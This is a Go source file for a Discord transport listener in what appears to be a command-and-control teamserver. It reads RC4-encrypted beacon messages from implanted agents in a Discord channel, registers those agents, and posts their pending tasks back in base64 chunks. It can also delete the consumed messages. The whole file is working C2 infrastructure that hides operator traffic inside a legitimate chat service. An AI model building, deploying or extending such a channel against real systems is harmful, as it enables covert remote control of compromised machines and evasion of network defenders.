package main

import (
	"crypto/rc4"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net/http"
	"strings"
	"sync"
	"time"
)

type Listener struct {
	transport *TransportDiscord
}

type ConfigDiscord struct {
	BotToken      string `json:"bot_token"`
	ChannelBeacon string `json:"channel_beacon"`
	ChannelTasks  string `json:"channel_tasks"`
	WebhookUrl    string `json:"webhook_url"`
	PollInterval  int    `json:"poll_interval"`
	Cleanup       bool   `json:"cleanup"`
	EncryptKey    string `json:"encrypt_key"`

	// Derived (not serialized to JSON)
	encryptKeyBytes []byte `json:"-"`
}

type TransportDiscord struct {
	Name     string
	Config   ConfigDiscord
	Active   bool
	stopChan chan struct{}
	client   *http.Client
	mu       sync.Mutex

	// ts is kept so Edit can rebuild the poll loop (the ticker is built in Start,
	// so without it a changed poll_interval would not take effect until restart).
	ts Teamserver

	// botUserId is our own Discord user id, learned from GET /users/@me at Start.
	// Empty means we could not identify ourselves -- see pollMessages: in that
	// state we must not delete anything, because we cannot tell our messages
	// apart from anyone else's.
	botUserId string

	// ownerAgentId is the single agent this listener has been serving. See
	// processMessage for why a second agent is refused rather than served.
	ownerAgentId string
}

// Discord API message structure
type DiscordMessage struct {
	Id      string `json:"id"`
	Content string `json:"content"`
	Author  struct {
		Id   string `json:"id"`
		Bot  bool   `json:"bot"`
		Name string `json:"name"`
	} `json:"author"`
}

// Discord API send message body
type DiscordSendBody struct {
	Content string `json:"content"`
}

const (
	discordAPIBase = "https://discord.com/api/v10"
	// Discord rate limit: 5 requests / 2 seconds per channel
	apiDelay = 500 * time.Millisecond
	// Max message content size (Discord limit is 2000 chars, base64 overhead ~33%)
	maxMessageSize = 1900
)

func (t *TransportDiscord) Start(ts Teamserver) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if t.Active {
		return errors.New("transport already active")
	}

	// Decode encrypt key
	if len(t.Config.encryptKeyBytes) == 0 {
		return errors.New("encrypt key not initialized")
	}

	// pollLoop builds time.NewTicker(PollInterval) -- and NewTicker **panics** on a
	// non-positive interval, inside a goroutine, which takes the whole teamserver
	// down. validConfig already rejects this on both the create and the restore
	// path; this is the last line of defence for a transport built any other way.
	if t.Config.PollInterval < 1 {
		return fmt.Errorf("poll_interval must be >= 1 (got %d)", t.Config.PollInterval)
	}

	t.ts = ts

	// A fresh Start is a fresh engagement: release the previous owner so a rebuilt
	// payload (new agent id) is not locked out by the agent this listener used to
	// serve. Ownership is re-claimed by the first agent that beats.
	t.ownerAgentId = ""

	t.client = &http.Client{
		Timeout: 30 * time.Second,
	}

	// Learn our own Discord user id so pollMessages can tell our own messages
	// apart from everything else posted in the channel. Failing here is not
	// fatal, but it does disable deletion (see pollMessages/processMessage).
	t.botUserId = ""
	if id, err := t.whoAmI(); err != nil {
		fmt.Printf("[discord:%s] WARNING: cannot identify own bot user (%v); message cleanup is disabled\n", t.Name, err)
	} else {
		t.botUserId = id
	}

	t.stopChan = make(chan struct{})
	t.Active = true

	fmt.Printf("   Started listener '%s': discord (beacon=%s, tasks=%s, poll=%ds)\n",
		t.Name, t.Config.ChannelBeacon, t.Config.ChannelTasks, t.Config.PollInterval)

	go t.pollLoop(ts, t.stopChan)

	return nil
}

// whoAmI returns our own Discord user id (GET /users/@me).
func (t *TransportDiscord) whoAmI() (string, error) {
	req, err := http.NewRequest("GET", discordAPIBase+"/users/@me", nil)
	if err != nil {
		return "", err
	}
	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)

	resp, err := t.client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(body))
	}

	var me struct {
		Id string `json:"id"`
	}
	if err = json.NewDecoder(resp.Body).Decode(&me); err != nil {
		return "", err
	}
	if me.Id == "" {
		return "", errors.New("discord returned an empty user id")
	}
	return me.Id, nil
}

func (t *TransportDiscord) Stop() error {
	t.mu.Lock()
	defer t.mu.Unlock()

	if !t.Active {
		return nil
	}

	close(t.stopChan)
	t.Active = false
	fmt.Printf("   Stopped listener '%s': discord\n", t.Name)
	return nil
}

// pollLoop runs until the given channel is closed. The channel is a parameter
// rather than a read of t.stopChan on purpose: Edit rebuilds the loop by calling
// Stop() then Start(), and Start installs a fresh t.stopChan. A loop that read
// t.stopChan each iteration could pick up the *new* channel and never observe the
// close of the old one, leaving two poll loops running against one listener.
func (t *TransportDiscord) pollLoop(ts Teamserver, stop <-chan struct{}) {
	ticker := time.NewTicker(time.Duration(t.Config.PollInterval) * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			return
		case <-ticker.C:
			t.pollMessages(ts)
		}
	}
}

func (t *TransportDiscord) pollMessages(ts Teamserver) {
	messages, err := t.getMessages(t.Config.ChannelBeacon)
	if err != nil {
		fmt.Printf("[discord:%s] Error polling beacon channel: %v\n", t.Name, err)
		return
	}

	for _, msg := range messages {
		content := strings.TrimSpace(msg.Content)
		if content == "" {
			continue
		}

		// Only look at messages this bot posted. Without this check ANY message in
		// the channel is fed to decryptBeat -- and, with cleanup on, deleted. A
		// webhook alert, an operator's note, or another integration sharing the
		// channel would be destroyed by us, and every non-beat message produced a
		// garbage decrypt that went on to TsAgentCreate.
		if t.botUserId != "" && msg.Author.Id != t.botUserId {
			continue
		}

		// Delete only what we actually consumed. Deleting on a parse/decrypt
		// failure threw away evidence and, more importantly, deleted messages we
		// had not understood.
		if t.processMessage(ts, msg) && t.Config.Cleanup && t.botUserId != "" {
			time.Sleep(apiDelay)
			if err := t.deleteMessage(t.Config.ChannelBeacon, msg.Id); err != nil {
				fmt.Printf("[discord:%s] Failed to delete message %s: %v\n", t.Name, msg.Id, err)
			}
		}

		// Rate limit delay between processing messages
		time.Sleep(apiDelay)
	}
}

// processMessage handles one beacon message and reports whether it was fully
// processed. The caller deletes only messages that return true.
func (t *TransportDiscord) processMessage(ts Teamserver, msg DiscordMessage) bool {
	content := strings.TrimSpace(msg.Content)

	// The beacon sends messages as: base64(beat_data) + "|" + base64(body_data)
	// Using | separator instead of \n (newline breaks JSON content)
	parts := strings.SplitN(content, "|", 2)

	beatB64 := strings.TrimSpace(parts[0])
	var bodyB64 string
	if len(parts) > 1 {
		bodyB64 = strings.TrimSpace(parts[1])
	}

	// Decode beat
	beatCrypt, err := base64.StdEncoding.DecodeString(beatB64)
	if err != nil || len(beatCrypt) < 5 {
		fmt.Printf("[discord:%s] Failed to decode beat from message %s: %v\n", t.Name, msg.Id, err)
		return false
	}

	agentType, agentId, beat, err := t.decryptBeat(beatCrypt)
	if err != nil {
		fmt.Printf("[discord:%s] Failed to decrypt beat from message %s: %v\n", t.Name, msg.Id, err)
		return false
	}

	// ★ One listener serves exactly one agent.
	//
	// The tasks channel is per-listener (Config.ChannelTasks) and the task blob
	// posted into it carries **no agent id** -- it is the raw
	// TsAgentGetHostedAll(agentId) output, base64'd. A beacon concatenates every
	// chunk it finds in that channel and decodes the result, so with two agents on
	// one listener each would decode the other's task pack and run the other's
	// commands. That cannot be fixed without changing the wire format, and the
	// beacon lives outside this tree -- so refuse the second agent loudly rather
	// than silently cross-delivering commands.
	t.mu.Lock()
	if t.ownerAgentId == "" {
		t.ownerAgentId = agentId
		fmt.Printf("[discord:%s] Agent %s now owns this listener's tasks channel; other agents will be refused.\n", t.Name, agentId)
	}
	owner := t.ownerAgentId
	t.mu.Unlock()

	if agentId != owner {
		fmt.Printf("[discord:%s] REFUSING agent %s: listener '%s' already serves agent %s. "+
			"Discord task delivery cannot tell agents apart (one shared tasks channel, no agent id in the payload), "+
			"so serving both would make each execute the other's commands. Use one Discord listener per agent.\n",
			t.Name, agentId, t.Name, owner)
		return false
	}

	// Decode body data if present
	var bodyData []byte
	if bodyB64 != "" {
		bodyData, err = base64.StdEncoding.DecodeString(bodyB64)
		if err != nil {
			fmt.Printf("[discord:%s] Failed to decode body from message %s: %v\n", t.Name, msg.Id, err)
			return false
		}
	}

	// Create agent if new
	if !Ts.TsAgentIsExists(agentId) {
		// The 5th argument is ExternalIP. It used to be the literal string
		// "discord", which is not an address -- it showed up verbatim in the
		// console's ExternalIP column. Every other listener passes the real peer
		// address, or "" when there is no peer (beacon_listener_dns does the same);
		// Discord has no peer address, so "".
		_, err = Ts.TsAgentCreate(agentType, agentId, beat, t.Name, "", true)
		if err != nil {
			fmt.Printf("[discord:%s] Failed to create agent %s: %v\n", t.Name, agentId, err)
			return false
		}
	}

	// Update tick
	_ = Ts.TsAgentSetTick(agentId, t.Name)

	// Process body data
	if len(bodyData) > 0 {
		_ = Ts.TsAgentProcessData(agentId, bodyData)
	}

	// Get pending tasks for this agent
	responseData, err := Ts.TsAgentGetHostedAll(agentId, 0x1900000) // 25 MB
	if err != nil {
		fmt.Printf("[discord:%s] Failed to get tasks for agent %s: %v\n", t.Name, agentId, err)
		return false
	}

	// Send tasks back via tasks channel
	if len(responseData) > 0 {
		encoded := base64.StdEncoding.EncodeToString(responseData)

		// Discord messages have a 2000 char limit, split if needed
		if err = t.sendChunkedMessage(t.Config.ChannelTasks, encoded); err != nil {
			fmt.Printf("[discord:%s] Failed to send tasks to agent %s: %v\n", t.Name, agentId, err)
			return false
		}
	}

	return true
}

func (t *TransportDiscord) decryptBeat(ciphertext []byte) (string, string, []byte, error) {
	// RC4 decryption (matching local beacon agent)
	rc4crypt, err := rc4.NewCipher(t.Config.encryptKeyBytes)
	if err != nil {
		return "", "", nil, errors.New("rc4 cipher error")
	}

	plaintext := make([]byte, len(ciphertext))
	rc4crypt.XORKeyStream(plaintext, ciphertext)

	if len(plaintext) < 8 {
		return "", "", nil, errors.New("beat plaintext too short")
	}

	agentType := uint(binary.BigEndian.Uint32(plaintext[:4]))
	agentId := uint(binary.BigEndian.Uint32(plaintext[4:8]))
	beat := plaintext[8:]

	return fmt.Sprintf("%08x", agentType), fmt.Sprintf("%08x", agentId), beat, nil
}

// getMessages retrieves messages from a Discord channel using the Bot API
func (t *TransportDiscord) getMessages(channelId string) ([]DiscordMessage, error) {
	url := fmt.Sprintf("%s/channels/%s/messages?limit=50", discordAPIBase, channelId)

	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		// Rate limited, back off
		return nil, errors.New("discord rate limited")
	}

	if resp.StatusCode != 200 {
		body, _ := io.ReadAll(resp.Body)
		return nil, fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(body))
	}

	var messages []DiscordMessage
	err = json.NewDecoder(resp.Body).Decode(&messages)
	if err != nil {
		return nil, err
	}

	return messages, nil
}

// sendMessage posts a message to a Discord channel using the Bot API
func (t *TransportDiscord) sendMessage(channelId string, content string) error {
	url := fmt.Sprintf("%s/channels/%s/messages", discordAPIBase, channelId)

	body := DiscordSendBody{Content: content}
	jsonBody, err := json.Marshal(body)
	if err != nil {
		return err
	}

	req, err := http.NewRequest("POST", url, strings.NewReader(string(jsonBody)))
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)
	req.Header.Set("Content-Type", "application/json")

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		return errors.New("discord rate limited")
	}

	if resp.StatusCode != 200 && resp.StatusCode != 201 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}

// sendChunkedMessage splits a large message into Discord-compatible chunks
// Each chunk is raw base64 (no prefix) — the beacon concatenates all chunks
// in order (oldest first) and base64-decodes the result.
// Chunks are split at 4-byte boundaries to keep valid base64.
func (t *TransportDiscord) sendChunkedMessage(channelId string, content string) error {
	if len(content) <= maxMessageSize {
		return t.sendMessage(channelId, content)
	}

	// Split at base64-safe boundary (multiple of 4)
	chunkSize := (maxMessageSize / 4) * 4 // round down to 4-byte boundary

	for len(content) > 0 {
		end := chunkSize
		if end > len(content) {
			end = len(content)
		}

		chunk := content[:end]
		content = content[end:]

		err := t.sendMessage(channelId, chunk)
		if err != nil {
			return fmt.Errorf("failed to send chunk: %v", err)
		}

		time.Sleep(apiDelay)
	}

	return nil
}

// deleteMessage removes a message from a Discord channel
func (t *TransportDiscord) deleteMessage(channelId string, messageId string) error {
	url := fmt.Sprintf("%s/channels/%s/messages/%s", discordAPIBase, channelId, messageId)

	req, err := http.NewRequest("DELETE", url, nil)
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", "Bot "+t.Config.BotToken)

	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode == 429 {
		return errors.New("discord rate limited")
	}

	// 204 No Content is the expected success response for DELETE
	if resp.StatusCode != 204 && resp.StatusCode != 200 {
		respBody, _ := io.ReadAll(resp.Body)
		return fmt.Errorf("discord API error %d: %s", resp.StatusCode, string(respBody))
	}

	return nil
}
